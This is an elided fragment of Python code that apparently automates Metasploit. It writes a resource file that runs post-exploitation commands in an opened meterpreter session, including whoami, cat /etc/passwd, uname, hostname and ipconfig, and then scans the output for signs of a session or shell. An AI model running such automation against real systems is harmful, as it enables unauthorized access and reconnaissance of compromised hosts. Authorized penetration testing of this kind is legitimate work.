        ...
        try:
            ...
            with open(rc_file, 'w') as f:
                ...
                if exploit_type == 'meterpreter':
                    ...
                    if os_type == 'linux':
                        f.write("sessions -C 'id' -i 1\nsleep 2\n")
                        f.write("sessions -C 'whoami' -i 1\nsleep 2\n")
                        f.write("sessions -C 'cat /etc/passwd' -i 1\nsleep 2\n")
                        f.write("sessions -C 'uname -a' -i 1\nsleep 1\n")
                        f.write("sessions -C 'hostname' -i 1\nsleep 1\n")
                    elif os_type == 'windows':
                        f.write("sessions -C 'whoami' -i 1\nsleep 2\n")
                        f.write("sessions -C 'hostname' -i 1\nsleep 2\n")
                        f.write("sessions -C 'ipconfig' -i 1\nsleep 2\n")
            ...
            if os.path.exists(output_file):
                ...
                for pattern in [r'Session (\d+) opened', r'Meterpreter session (\d+) opened',
                ...
                if not result['session_id']:
                    for indicator in ['uid=', 'Shell Banner:', 'root@', 'C:\\']:
